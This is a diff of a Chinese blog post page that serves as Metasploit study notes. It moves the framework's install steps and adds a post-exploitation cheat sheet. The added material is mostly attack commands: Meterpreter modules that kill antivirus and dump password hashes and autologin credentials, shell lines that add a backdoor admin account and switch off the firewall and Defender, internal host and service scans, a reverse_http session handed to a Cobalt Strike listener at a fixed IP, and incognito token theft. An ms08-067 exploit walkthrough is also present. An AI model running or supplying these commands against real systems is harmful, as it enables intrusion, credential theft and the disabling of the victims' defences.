@@ -8,7 +8,7 @@
   
   
   
-  <title>Metasploit簡介 | JohnScott2046的博客</title>
+  <title>12Metasploit簡介 | JohnScott2046的博客</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -254,7 +254,7 @@
 
 <div class="post">
   <h1 class="article-title">
-    <span>Metasploit簡介</span>
+    <span>12Metasploit簡介</span>
   </h1>
   <div class="article-top-meta">
     <span>
@@ -280,7 +280,16 @@
 
   <div class="article-content">
     <div class="markdown-body">
-      <h2 id="一、-Metasploit簡介"><a href="#一、-Metasploit簡介" class="headerlink" title="一、 Metasploit簡介"></a>一、 Metasploit簡介</h2><h3 id="1、-Metasploit-框架"><a href="#1、-Metasploit-框架" class="headerlink" title="1、 Metasploit 框架"></a>1、 Metasploit 框架</h3><p>渗透测试者的困扰：在众多相同类型的工具，不知道如何选择。面對数百个工具软件，上千个命令参数，很難都記住使用方法。新出现的漏洞 POC/EXP 有不同的运行环境要求，准备工作繁琐。大部分时间都在学习不同工具的使用，Metasploit就是很多個工具使用的统一</p>
+      <h2 id="linux安裝"><a href="#linux安裝" class="headerlink" title="linux安裝"></a>linux安裝</h2><p>curl <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb">https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb</a> &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</p>
+<p>apt install postgresql<br>systemctl start postgresql<br>systemctl enable postgresql </p>
+<p>useradd -m postgresql<br>passwd postgresql</p>
+<p>su postgresql<br>msfdb init</p>
+<p>msfconsole<br>db_status</p>
+<p>出現以下內容，即為安裝成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_status</span><br><span class="line">[*] Connected to msf. Connection type: postgresql.</span><br></pre></td></tr></table></figure>
+
+<p>參照文章 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/601a3cb65e11">Debian10 安装 Metasploit Framework 指南</a></p>
+<h2 id="一、-Metasploit簡介"><a href="#一、-Metasploit簡介" class="headerlink" title="一、 Metasploit簡介"></a>一、 Metasploit簡介</h2><h3 id="1、-Metasploit-框架"><a href="#1、-Metasploit-框架" class="headerlink" title="1、 Metasploit 框架"></a>1、 Metasploit 框架</h3><p>渗透测试者的困扰：在众多相同类型的工具，不知道如何选择。面對数百个工具软件，上千个命令参数，很難都記住使用方法。新出现的漏洞 POC/EXP 有不同的运行环境要求，准备工作繁琐。大部分时间都在学习不同工具的使用，Metasploit就是很多個工具使用的统一</p>
 <p>POC，全称”Proof of Concept”，中文“概念验证”，常用於一段漏洞证明的代码<br>EXP，全称”Exploit”，中文“利用”，指利用系统漏洞進行攻击的動作</p>
 <p>Metasploit 框架是可以添加漏洞代码片段，就好比一个军火库，它里面有各种武器，当然也有新的武器被研发出来，放到武器库里面后，隨時可以使用，这就是框架的好处，新的攻击代码可以比较容易的加入 MSF 框架供大家使用</p>
 <h3 id="2、-Metasploit-简介"><a href="#2、-Metasploit-简介" class="headerlink" title="2、 Metasploit 简介"></a>2、 Metasploit 简介</h3><p>官網 <a target="_blank" rel="noopener" href="https://www.metasploit.com/">metasploit</a></p>
@@ -400,7 +409,51 @@
 <p>idletime/resource<br>查看目标操作系统空闲时间/调用外部的资源文件，自劢化执行</p>
 <p>record_mic/webcam_list/webcam_snap -i 1 -v false<br>记录目标麦克风的声音/列出目标系统上所有的摄像头/每隑一秒钟用摄像头拍照一次</p>
 <p>桌面抓图：screenshot<br>拍照：webcam_snap<br>视频开启：webcam_stream<br>开启远程桌面：run post/windows/manage/enable_rdp<br>添加账号：net user test 123 /add<br>获取系统管理密码：load mimikatz<br>wdigest</p>
-<h2 id="七、-流程"><a href="#七、-流程" class="headerlink" title="七、 流程"></a>七、 流程</h2><p>1、查找 ms08-067 漏洞模块</p>
+<h3 id="七、-Post后渗透模块"><a href="#七、-Post后渗透模块" class="headerlink" title="七、 Post后渗透模块"></a>七、 Post后渗透模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;migrate           #自动进程迁移</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;checkvm           #查看目标主机是否运行在虚拟机上</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;killav            #关闭杀毒软件</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp        #开启远程桌面服务</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;autoroute         #查看路由信息</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users    #列举当前登录的用户</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications       #列举应用程序</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin #抓取自动登录的用户名和密码</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump               #dump出所有用户的hash</span><br><span class="line">run getgui -u hack -p 123</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_patches   补丁信息</span><br><span class="line">run  post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester   查询可利用的漏洞</span><br></pre></td></tr></table></figure>
+
+
+<p>有时候无法使用后渗透模块添加用户，可以使用shell自主添加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net user hack Zyx960706 &#x2F;add</span><br><span class="line">net localgroup administrator hack &#x2F;add</span><br><span class="line">netsh advfirewall set allprofiles state off        #关闭防火墙</span><br><span class="line">net stop windefend</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_patches   补丁信息</span><br><span class="line">run  post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester   查询可利用的漏洞</span><br></pre></td></tr></table></figure>
+
+<p>域内存活主机探测（系统、端口）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_sweep    #基于udp协议发现内网存活主机</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_probe    #基于udp协议发现内网存活主机</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname         #基于netbios协议发现内网存活主机</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp           #基于tcp进行端口扫描(1-10000)，如果开放了端口，则说明该主机存活</span><br></pre></td></tr></table></figure>
+
+<p>端口扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp           #基于tcp进行端口扫描(1-10000)</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;ack           #基于tcp的ack回复进行端口扫描，默认扫描1-10000端口</span><br><span class="line">端口扫描有时会使会话终端，所以可以上传nmap后在shell中使用nmap扫描。但是要记得清理</span><br></pre></td></tr></table></figure>
+
+<p>服务扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_version        #发现内网ftp服务，基于默认21端口</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_version        #发现内网ssh服务，基于默认22端口</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version  #发现内网telnet服务，基于默认23端口</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;dns&#x2F;dns_amp            #发现dns服务，基于默认53端口</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;http&#x2F;http_version      #发现内网http服务，基于默认80端口</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;http&#x2F;title             #探测内网http服务的标题</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version        #发现内网smb服务，基于默认的445端口   </span><br><span class="line">use auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_schemadump  #发现内网SQLServer服务,基于默认的1433端口</span><br><span class="line">use auxiliary&#x2F;scanner&#x2F;oracle&#x2F;oracle_hashdump  #发现内网oracle服务,基于默认的1521端口</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_version    #发现内网mysql服务，基于默认3306端口</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;rdp&#x2F;rdp_scanner        #发现内网RDP服务，基于默认3389端口</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;redis&#x2F;redis_server     #发现内网Redis服务，基于默认6379端口</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;db2&#x2F;db2_version        #探测内网的db2服务，基于默认的50000端口</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname         #探测内网主机的netbios名字</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="八、-msf-会话传递-cs"><a href="#八、-msf-会话传递-cs" class="headerlink" title="八、 msf 会话传递 cs"></a>八、 msf 会话传递 cs</h3><p>创建监听 beacon http  设置 http host、 http host(stager)、 profile、 http port(c2) 映射端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost 101.42.249.212</span><br><span class="line">set lport 映射端口</span><br><span class="line">set session 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h3 id="九、-MSF令牌窃取"><a href="#九、-MSF令牌窃取" class="headerlink" title="九、 MSF令牌窃取"></a>九、 MSF令牌窃取</h3><p>不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝；</p>
+<p>比如A用户创建一个进程而该进程B用户没有权限，一般用户双击运行一个进程都会拷贝explorer.exe的Access Token；</p>
+<p>这里有两种类型的令牌</p>
+<ol>
+<li><p>授权令牌（Delegation Tokens），它支持交互式登录，例如远程桌面，用户桌面访问。</p>
+</li>
+<li><p>模拟令牌（Impersonation Tokens），它支持非交互式的会话，例如访问目标共享文件。</p>
+</li>
+</ol>
+<p>两种令牌会在系统重启后才会清除；授权令牌在用户注销后，该令牌会变为模拟令牌会依旧有效</p>
+<p>令牌窃取</p>
+<ol>
+<li><p>获取到了目标机器的 meterpreter shell</p>
+</li>
+<li><p>使用内置的工具 incognito</p>
+</li>
+</ol>
+<p>use incognito</p>
+<p>list_tokens -u</p>
+<p>如果运行的shell是一个system权限的，就可以窃取到system和比system权限低的用户</p>
+<ol start="3">
+<li>切换域管的令牌</li>
+</ol>
+<p>impersonate_token ‘主机名\Administrator’</p>
+<p>返回原来的权限<br>rev2self </p>
+<h2 id="十、-流程"><a href="#十、-流程" class="headerlink" title="十、 流程"></a>十、 流程</h2><p>1、查找 ms08-067 漏洞模块</p>
 <p>nmap -sS 192.168.1.1</p>
 <p>search ms08-067</p>
 <p>use exploit/windows/smb/ms08_067_netapi</p>
@@ -420,15 +473,6 @@
 <p>6、开始利用该模块</p>
 <p>exploit  </p>
 <p>攻击成功后，直接获得目标主机的 Shell</p>
-<h3 id="linux-安裝"><a href="#linux-安裝" class="headerlink" title="linux 安裝"></a>linux 安裝</h3><p>curl <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb">https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb</a> &gt; msfinstall &amp;&amp; <br>  chmod 755 msfinstall &amp;&amp; <br>  ./msfinstall</p>
-<p>apt install postgresql<br>systemctl start postgresql<br>systemctl enable postgresql </p>
-<p>useradd -m postgresql<br>passwd postgresql</p>
-<p>su postgresql<br>msfdb init</p>
-<p>msfconsole<br>db_status</p>
-<p>出現以下內容，即為安裝成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_status</span><br><span class="line">[*] Connected to msf. Connection type: postgresql.</span><br></pre></td></tr></table></figure>
-
-<p>參照文章 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/601a3cb65e11">Debian10 安装 Metasploit Framework 指南</a></p>
     </div>
   </div>
   
@@ -531,13 +575,13 @@
       <div class="nav-pre">
         <i class="iconfont icon-prev"></i>
         上一篇:
-        <a href="/2021/11%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/" target="_self">Web漏洞扫描工具</a>
+        <a href="/2021/11%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/" target="_self">11Web漏洞扫描工具</a>
       </div>
     
     
       <div class="nav-next">
         下一篇:
-        <a href="/2021/13Metasploit%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" target="_self">Metasploit信息搜集</a>
+        <a href="/2021/13Metasploit%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" target="_self">13Metasploit信息搜集</a>
         <i class="iconfont icon-next"></i>
       </div>
     
